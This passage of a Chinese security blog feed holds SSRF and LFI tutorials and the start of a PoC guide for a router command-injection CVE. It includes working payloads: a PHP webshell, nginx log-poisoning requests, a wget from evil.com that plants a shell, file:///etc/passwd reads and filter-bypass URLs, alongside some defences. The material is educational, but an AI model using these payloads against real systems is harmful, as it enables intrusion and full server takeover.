的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用 <code>curl</code> 获取数据。</p><h2 id="阻碍-SSRF-漏洞利用的场景"><a href="#阻碍-SSRF-漏洞利用的场景" class="headerlink" title="阻碍 SSRF 漏洞利用的场景"></a>阻碍 SSRF 漏洞利用的场景</h2><ul><li>服务器开启 OpenSSL 无法进行交互利用</li><li>服务端需要鉴权（Cookies &amp; User：Pass）不能完美利用</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul><h2 id="利用-SSRF-进行端口扫描"><a href="#利用-SSRF-进行端口扫描" class="headerlink" title="利用 SSRF 进行端口扫描"></a>利用 SSRF 进行端口扫描</h2><p>根据服务器的返回信息进行判断，大部分应用不会判别端口，可通过返回的 banner 信息判断端口状态。</p><p>后端实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;txt&#x27;</span>;<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$link</span>);<br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_FILE, <span class="hljs-variable">$fp</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>)); <br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造一个前端页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;px&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/ss.php&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;commit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>请求非 HTTP 的端口可以返回 banner 信息。</p><p>或可利用 302 跳转绕过 HTTP 协议的限制。</p><p>辅助脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$port</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><span class="hljs-variable">$scheme</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$scheme</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$data</span>&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h2><h4 id="Dict-协议"><a href="#Dict-协议" class="headerlink" title="Dict 协议"></a>Dict 协议</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">dict:</span>//fuzz.wuyun<span class="hljs-meta">.org</span>:<span class="hljs-number">8080</span>/helo:dict<br></code></pre></td></tr></table></figure><h4 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">gopher:</span>//fuzz.wuyun<span class="hljs-meta">.org</span>:<span class="hljs-number">8080</span>/gopher<br></code></pre></td></tr></table></figure><h4 id="File-协议"><a href="#File-协议" class="headerlink" title="File 协议"></a>File 协议</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><ol><li>更改 IP 地址写法 例如<code>192.168.0.1</code><ul><li>8 进制格式：<code>0300.0250.0.1</code></li><li>16 进制格式：<code>0xC0.0xA8.0.1</code></li><li>10 进制整数格式：<code>3232235521</code></li><li>16 进制整数格式：<code>0xC0A80001</code></li><li>还有一种特殊的省略模式，例如<code>10.0.0.1</code>这个 IP 可以写成<code>10.1</code></li></ul></li><li>利用 URL 解析问题 在某些情况下，后端程序可能会对访问的 URL 进行解析，对解析出来的 host 地址进行过滤。这时候可能会出现对 URL 参数解析不当，导致可以绕过过滤。 例如：<ul><li><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容</li><li>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1/</code></li><li>短地址<code>http://dwz.cn/11SMa</code>&#x3D;&#x3D;&gt;<code>http://127.0.0.1</code></li><li>利用句号<code>。</code>：<code>127。0。0。1</code>&#x3D;&#x3D;&gt;<code>127.0.0.1</code></li><li>添加端口混淆：<code>http://127.0.0.1:80@evil.com</code></li><li>利用<code>#</code>分割：<code>http://evil.com#@127.0.0.1</code></li><li>利用 Enclosed alphanumerics</li></ul></li></ol><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br><span class="hljs-symbol">List:</span><br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ <br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ <br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ <br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ <br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ <br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ <br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ <br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息;</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>对内网 web 应用进行指纹识别，通过访问默认文件实现;</li><li>攻击内外网的 web 应用，主要是使用 get 参数就可以实现的攻击（比如 struts2，sqli 等）;</li><li>利用 file 协议读取本地文件等。</li></ul><h3 id="浏览器通过file-访问文件和http-访问文件的区别"><a href="#浏览器通过file-访问文件和http-访问文件的区别" class="headerlink" title="浏览器通过file:&#x2F;&#x2F;访问文件和http:&#x2F;&#x2F;访问文件的区别"></a>浏览器通过file:&#x2F;&#x2F;访问文件和http:&#x2F;&#x2F;访问文件的区别</h3><p>file协议用于访问本地计算机中的文件，好比通过资源管理器中打开文件一样，需要主要的是它是针对本地的，即file协议是<strong>访问你本机的文件资源。</strong></p><p>http访问本地的html文件，相当于<strong>将本机作为了一台http服务器，然后通过localhost访问的是你自己电脑上的本地服务器，再通过http服务器去访问你本机的文件资源。</strong></p><p>再简单点就是file只是简单请求了本地文件，将其作为一个服务器未解析的静态文件打开。而http是在本地搭建了一个服务器再通过服务器去动态解析拿到文件。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2025/04/18/shell/"/>
    <url>/2025/04/18/shell/</url>
    
    <content type="html"><![CDATA[<h3 id="深入详解：WebShell-与日志文件包含攻击"><a href="#深入详解：WebShell-与日志文件包含攻击" class="headerlink" title="深入详解：WebShell 与日志文件包含攻击"></a>深入详解：WebShell 与日志文件包含攻击</h3><h4 id="一、什么是-WebShell？"><a href="#一、什么是-WebShell？" class="headerlink" title="一、什么是 WebShell？"></a>一、什么是 WebShell？</h4><p><strong>WebShell 本质</strong>：<br>一个隐藏在网站服务器上的恶意脚本文件，攻击者通过浏览器就能远程控制服务器，就像在服务器内部安装了”遥控器”。</p><p><strong>典型 WebShell 代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>访问方式：<code>http://target.com/shell.php?cmd=ls</code></li><li>效果：服务器会执行<code>ls</code>命令并返回结果</li></ul><p><strong>WebShell 的作用</strong>：</p><ol><li>执行系统命令（查看文件、修改配置）</li><li>上传&#x2F;下载文件</li><li>数据库操作</li><li>内网渗透跳板</li><li>持久化后门（即使漏洞修复仍能控制）</li></ol><h4 id="二、你提供的攻击流程详解"><a href="#二、你提供的攻击流程详解" class="headerlink" title="二、你提供的攻击流程详解"></a>二、你提供的攻击流程详解</h4><h5 id="完整攻击步骤："><a href="#完整攻击步骤：" class="headerlink" title="完整攻击步骤："></a>完整攻击步骤：</h5><pre><code class=" mermaid">graph TDA[污染日志] --&gt; B[包含日志]B --&gt; C[执行代码]C --&gt; D[获取WebShell]D --&gt; E[完全控制服务器]</code></pre><h5 id="详细解析："><a href="#详细解析：" class="headerlink" title="详细解析："></a>详细解析：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><p><strong>步骤分解</strong>：</p><ol><li><p><strong>污染日志（植入代码）</strong><br>首先需要让日志包含PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/&lt;?php</span> $_<span class="hljs-keyword">GET</span>[&#x27;2&#x27;]);?&gt; <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> target.com<br></code></pre></td></tr></table></figure><p>日志会记录：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">[2025-06-11] &quot;GET /</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 404 ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>触发代码执行</strong><br>访问包含漏洞页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">target.com/vuln.php?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure></li><li><p><strong>服务器实际执行的代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /var/www/html/fl0g.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>system(&#39;tac ...&#39;)</code>：执行系统命令读取flag文件</li><li><code>phpinfo()</code>：输出PHP配置信息</li></ul></li><li><p><strong>结果定位技巧</strong>：<br>在返回的网页中：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">FLAG</span><span class="hljs-template-variable">&#123;this_is_secret&#125;</span><span class="language-xml">  &lt;-- 命令执行结果</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo()的起始标签</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PHP信息<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">...</span><br></code></pre></td></tr></table></figure><p>只需在<code>&lt;!DOCTYPE html&gt;</code>前面查找就能看到命令执行结果</p></li></ol><h4 id="三、如何升级为完整-WebShell"><a href="#三、如何升级为完整-WebShell" class="headerlink" title="三、如何升级为完整 WebShell"></a>三、如何升级为完整 WebShell</h4><h5 id="方法1：直接写入-WebShell"><a href="#方法1：直接写入-WebShell" class="headerlink" title="方法1：直接写入 WebShell"></a>方法1：直接写入 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php system($_GET[0]);?&gt;&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><ul><li>效果：创建 <code>shell.php</code> 后门文件</li><li>使用：<code>http://target.com/shell.php?0=ls</code></li></ul><h5 id="方法2：下载现成-WebShell"><a href="#方法2：下载现成-WebShell" class="headerlink" title="方法2：下载现成 WebShell"></a>方法2：下载现成 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;wget http://evil.com/shell.txt -O /var/www/html/shell.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><h5 id="方法3：使用专业工具连接"><a href="#方法3：使用专业工具连接" class="headerlink" title="方法3：使用专业工具连接"></a>方法3：使用专业工具连接</h5><ol><li>写入 WebShell 后</li><li>使用中国蚁剑&#x2F;冰蝎连接：<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">连接<span class="hljs-built_in">URL</span>：<span class="hljs-keyword">http</span>://target.com/<span class="hljs-built_in">shell</span>.php<br>密码：cmd（根据WebShell代码设定）<br></code></pre></td></tr></table></figure><img src="https://example.com/antsword.jpg" alt="蚁剑界面示例"></li></ol><h4 id="四、为什么需要这样操作？"><a href="#四、为什么需要这样操作？" class="headerlink" title="四、为什么需要这样操作？"></a>四、为什么需要这样操作？</h4><ol><li><p><strong>绕过防御</strong>：</p><ul><li>当直接上传文件被禁止时</li><li>当常见协议（php:&#x2F;&#x2F;, data:&#x2F;&#x2F;）被过滤时</li></ul></li><li><p><strong>隐蔽性强</strong>：</p><ul><li>日志文件是合法系统文件</li><li>不会新增可疑文件（无文件落地）</li></ul></li><li><p><strong>多阶段攻击</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">攻击者-&gt;服务器: 污染日志<br>攻击者-&gt;服务器: 触发包含漏洞<br>服务器--&gt;攻击者: 返回命令结果<br>攻击者-&gt;服务器: 部署WebShell<br>服务器--&gt;攻击者: 持久控制通道<br></code></pre></td></tr></table></figure></li></ol><h4 id="五、实际案例演示"><a href="#五、实际案例演示" class="headerlink" title="五、实际案例演示"></a>五、实际案例演示</h4><p>假设目标网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//vuln-site.com/index.php?page=about.php</span><br></code></pre></td></tr></table></figure><p><strong>攻击过程</strong>：</p><ol><li><p>检测LFI漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>etc/passwd<br></code></pre></td></tr></table></figure></li><li><p>污染日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://vuln-site.com/&lt;?php system(\$_GET[&#x27;exec&#x27;]);?&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>执行命令（查找flag）：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://vuln-site.com/<span class="hljs-built_in">index</span>.php?page=/var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span>&amp;exec=find / -<span class="hljs-keyword">name</span> flag*<br></code></pre></td></tr></table></figure></li><li><p>结果定位：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">/var/secret/flag.txt  &lt;-- 命令输出<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo起始标记<br></code></pre></td></tr></table></figure></li><li><p>读取flag：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>var<span class="hljs-regexp">/log/</span>nginx<span class="hljs-regexp">/access.log&amp;exec=cat /</span>var<span class="hljs-regexp">/secret/</span>flag.txt<br></code></pre></td></tr></table></figure></li></ol><h4 id="六、防御措施"><a href="#六、防御措施" class="headerlink" title="六、防御措施"></a>六、防御措施</h4><ol><li><p><strong>服务器防护</strong>：</p><ul><li>设置 <code>open_basedir</code> 限制文件访问范围</li><li>禁用危险函数：<code>system, exec, shell_exec</code></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">disable_functions</span> = system,exec,passthru<br></code></pre></td></tr></table></figure></li><li><p><strong>日志安全</strong>：</p><ul><li>将日志移出Web目录</li><li>设置日志文件不可执行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i /var/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p><strong>代码层面</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 安全的文件包含</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;about&#x27;</span>,<span class="hljs-string">&#x27;contact&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>入侵检测</strong>：</p><ul><li>监控异常日志条目（包含<code>&lt;?php</code>的请求）</li><li>使用WAF过滤包含特殊字符的请求</li></ul></li></ol><p>这种攻击方式巧妙利用了服务器自身的日志功能，即使在没有文件上传漏洞的情况下也能实现完全控制，是LFI漏洞中最危险的利用方式之一。</p><p>直接通过get请求写马会导致代码被URL编码，导致日志中存储的是编码后的文本，不是可执行代码。UA头不会被编码</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>POC</title>
    <link href="/2025/04/17/POC/"/>
    <url>/2025/04/17/POC/</url>
    
    <content type="html"><![CDATA[<p>编写一个漏洞的 Proof of Concept (PoC)，并以 <strong>CVE-2022-34577 (WAVLINK WN535 G3 命令注入)</strong> 作为完美案例。</p><hr><h3 id="第一步：理解漏洞（情报分析）"><a href="#第一步：理解漏洞（情报分析）" class="headerlink" title="第一步：理解漏洞（情报分析）"></a>第一步：理解漏洞（情报分析）</h3><p>在写任何代码之前，你必须先彻底搞懂这个漏洞。我们从您提供的 <code>info</code> 块中提取关键情报：</p><ul><li><strong>漏洞名称 (Name):</strong> Command Execution in WAVLINK WN535 G3 adm.cgi<ul><li><strong>解读：</strong> 这是一个<strong>命令执行</strong>漏洞。意味着我们可以让设备执行我们想要的操作系统命令。</li></ul></li><li><strong>触发点 (Description):</strong> “via a crafted POST request” to “adm.cgi”<ul><li><strong>解读：</strong> 漏洞是通过向 <code>/adm.cgi</code> 这个路径发送一个特制的 <strong>POST 请求</strong>来触发的。</li></ul></li><li><strong>影响 (Impact):</strong> Remote Code Execution (RCE)<ul><li><strong>解读：</strong> 危害极高，可以完全控制设备。</li></ul></li></ul><p><strong>小结：</strong> 我们的目标是，向目标设备的 <code>/adm.cgi</code> 发送一个POST请求，这个请求的 body 中要包含我们想执行的命令。</p><hr><h3 id="第二步：找到注入点和载荷（寻找作案工具）"><a href="#第二步：找到注入点和载荷（寻找作案工具）" class="headerlink" title="第二步：找到注入点和载荷（寻找作案工具）"></a>第二步：找到注入点和载荷（寻找作案工具）</h3><p>现在我们知道要在 <code>/adm.cgi</code> 上“动手脚”，但具体怎么做？</p><ul><li><p><strong>注入点 (Injection Point):</strong><br>漏洞的描述是“特制的POST请求”，但没说是哪个参数。这时，我们可以从您提供的 Nuclei 模板的 <code>body</code> 部分找到线索：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">body: &quot;cmd=</span><span class="hljs-template-variable">&#123;&#123;<span 